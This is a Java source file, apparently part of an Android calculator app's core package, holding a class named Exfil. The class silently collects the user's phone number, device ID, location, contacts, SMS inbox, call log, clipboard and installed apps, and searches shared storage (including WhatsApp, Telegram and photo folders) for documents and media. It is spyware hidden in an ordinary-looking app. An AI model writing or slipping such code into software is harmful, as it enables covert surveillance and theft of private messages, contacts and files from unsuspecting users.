package com.yangdai.calc.core;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class Exfil {

    @SuppressLint("MissingPermission")
    public static String phoneNumber(Context c) {
        try {
            TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return "";
            String n = tm.getLine1Number();
            return n == null ? "" : n;
        } catch (Exception e) { return ""; }
    }

    public static int battery(Context c) {
        try {
            IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent b = c.registerReceiver(null, f);
            if (b == null) return 0;
            int lvl = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = b.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (lvl < 0 || scale <= 0) return 0;
            return (int) (lvl * 100f / scale);
        } catch (Exception e) { return 0; }
    }

    public static boolean isRooted() {
        String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
        for (String p : paths) if (new File(p).exists()) return true;
        return false;
    }

    public static String androidId(Context c) {
        try {
            return Settings.Secure.getString(c.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) { return ""; }
    }

    @SuppressLint("MissingPermission")
    public static JSONObject location(Context c) {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return o;
            Location best = null;
            for (String p : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(p);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            }
            if (best != null) {
                o.put("lat", best.getLatitude());
                o.put("lng", best.getLongitude());
                o.put("acc", best.getAccuracy());
                o.put("provider", best.getProvider());
                o.put("time", best.getTime());
            }
        } catch (Exception ignored) {}
        return o;
    }

    public static JSONArray contacts(Context c) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
            if (cur == null) return arr;
            int nameI = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numI  = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int lim = 0;
            while (cur.moveToNext() && lim++ < 2000) {
                JSONObject o = new JSONObject();
                o.put("name", cur.getString(nameI));
                o.put("number", cur.getString(numI));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }

    public static JSONArray sms(Context c) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC")) {
            if (cur == null) return arr;
            int addrI = cur.getColumnIndex("address");
            int bodyI = cur.getColumnIndex("body");
            int dateI = cur.getColumnIndex("date");
            int lim = 0;
            while (cur.moveToNext() && lim++ < 1000) {
                JSONObject o = new JSONObject();
                o.put("from", cur.getString(addrI));
                o.put("body", cur.getString(bodyI));
                o.put("date", cur.getLong(dateI));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }

    public static JSONArray callLog(Context c) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(
                Uri.parse("content://call_log/calls"), null, null, null, "date DESC")) {
            if (cur == null) return arr;
            int numI = cur.getColumnIndex("number");
            int durI = cur.getColumnIndex("duration");
            int typeI = cur.getColumnIndex("type");
            int dateI = cur.getColumnIndex("date");
            int lim = 0;
            while (cur.moveToNext() && lim++ < 1000) {
                JSONObject o = new JSONObject();
                o.put("number", cur.getString(numI));
                o.put("duration", cur.getLong(durI));
                o.put("type", cur.getInt(typeI));
                o.put("date", cur.getLong(dateI));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }

    public static JSONArray listFiles(File dir, int depth) {
        JSONArray arr = new JSONArray();
        if (depth > 3 || dir == null || !dir.exists()) return arr;
        File[] files = dir.listFiles();
        if (files == null) return arr;
        int lim = 0;
        for (File f : files) {
            if (lim++ > 500) break;
            try {
                JSONObject o = new JSONObject();
                o.put("name", f.getName());
                o.put("dir", f.isDirectory());
                o.put("size", f.length());
                o.put("path", f.getAbsolutePath());
                arr.put(o);
                if (f.isDirectory()) {
                    JSONArray sub = listFiles(f, depth + 1);
                    for (int i = 0; i < sub.length(); i++) arr.put(sub.get(i));
                }
            } catch (Exception ignored) {}
        }
        return arr;
    }

    public static List<File> searchDocs() {
        List<File> out = new ArrayList<>();
        String[] roots = {"/sdcard/Download", "/sdcard/Documents", "/sdcard/DCIM",
                "/sdcard/Pictures", "/sdcard/WhatsApp", "/sdcard/Telegram"};
        for (String r : roots) walk(new File(r), out, 0);
        return out;
    }

    private static void walk(File d, List<File> out, int depth) {
        if (depth > 4 || d == null || !d.exists()) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (out.size() > 3000) return;
            if (f.isDirectory()) walk(f, out, depth + 1);
            else {
                String n = f.getName().toLowerCase();
                if (n.endsWith(".pdf") || n.endsWith(".doc") || n.endsWith(".docx")
                        || n.endsWith(".xls") || n.endsWith(".xlsx") || n.endsWith(".txt")
                        || n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4")) {
                    out.add(f);
                }
            }
        }
    }

    public static JSONArray installedApps(Context c) {
        JSONArray arr = new JSONArray();
        try {
            android.content.pm.PackageManager pm = c.getPackageManager();
            for (android.content.pm.ApplicationInfo ai :
                    pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)) {
                JSONObject o = new JSONObject();
                o.put("pkg", ai.packageName);
                o.put("name", pm.getApplicationLabel(ai).toString());
                o.put("sys", (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }

    public static String clipboard(Context c) {
        try {
            android.content.ClipboardManager cm =
                    (android.content.ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip().getItemCount() > 0) {
                CharSequence t = cm.getPrimaryClip().getItemAt(0).coerceToText(c);
                return t == null ? "" : t.toString();
            }
        } catch (Exception ignored) {}
        return "";
    }
}
